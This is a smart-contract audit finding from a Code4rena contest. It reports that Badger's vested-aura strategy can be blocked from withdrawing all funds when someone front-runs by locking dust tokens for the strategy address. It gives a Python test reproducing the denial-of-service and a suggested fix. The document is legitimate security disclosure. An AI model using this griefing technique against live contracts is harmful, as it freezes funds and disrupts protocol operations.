## Tags

- bug
- 2 (Med Risk)
- disagree with severity
- sponsor confirmed
- valid

# [Withdrawing all funds at once to vault can be DoS attacked by frontrunning and locking dust](https://github.com/code-423n4/2022-06-badger-findings/issues/92) 

# Lines of code

https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L184-L187


# Vulnerability details

## Impact

All funds can be migrated (withdrawn) at once to the caller vault by using the `BaseStrategy.withdrawToVault` function which internally calls `MyStrategy._withdrawAll`.

The latter function has the following check in place:

[MyStrategy.sol#L184-L187](https://github.com/Badger-Finance/vested-aura/blob/d504684e4f9b56660a9e6c6dfb839dcebac3c174/contracts/MyStrategy.sol#L184-L187)

```solidity
require(
    balanceOfPool() == 0 && LOCKER.balanceOf(address(this)) == 0,
    "You have to wait for unlock or have to manually rebalance out of it"
);
```

Funds can only be withdrawn (migrated) if the balance in `LOCKER` is fully unlocked.

By locking a small amount of want tokens via `AuraLocker.lock` with the `strategy` address, a malicious individual can cause DoS and prevent withdrawing and migrating funds to the vault.

## Proof of Concept

The following test case will replicate the DoS attack by locking "dust" want tokens for the `strategy` address. This causes `vault.withdrawToVault` to revert.

```python
def test_frontrun_migration(locker, deployer, vault, strategy, want, governance, keeper):
    # Setup
    randomUser = accounts[6]
    snap = SnapshotManager(vault, strategy, "StrategySnapshot")

    startingBalance = want.balanceOf(deployer)
    depositAmount = startingBalance // 2
    assert startingBalance >= depositAmount
    # End Setup

    # Deposit
    want.approve(vault, MaxUint256, {"from": deployer})
    snap.settDeposit(depositAmount, {"from": deployer})

    chain.sleep(15)
    chain.mine()

    vault.earn({"from": keeper})

    chain.snapshot()

    # Test no harvests
    chain.sleep(86400 * 250)  ## Wait 250 days so we can withdraw later
    chain.mine()

    before = {"settWant": want.balanceOf(vault), "stratWant": strategy.balanceOf()}

    strategy.prepareWithdrawAll({"from": governance})

    want.approve(locker, 1, {"from": deployer})
    locker.lock(strategy, 1, { "from": deployer }) # Donate "dust" want tokens to strategy

    vault.withdrawToVault({"from": governance}) # @audit-info reverts with "You have to wait for unlock or have to manually rebalance"

    after = {"settWant": want.balanceOf(vault), "stratWant": strategy.balanceOf()}

    assert after["settWant"] > before["settWant"]
    assert after["stratWant"] < before["stratWant"]
    assert after["stratWant"] == 0
```

## Tools Used

Manual review

## Recommended mitigation steps

Call `LOCKER.processExpiredLocks(false);` in `MyStrategy._withdrawAll` directly and remove the check which enforces unlocking all want tokens on L184-L187.


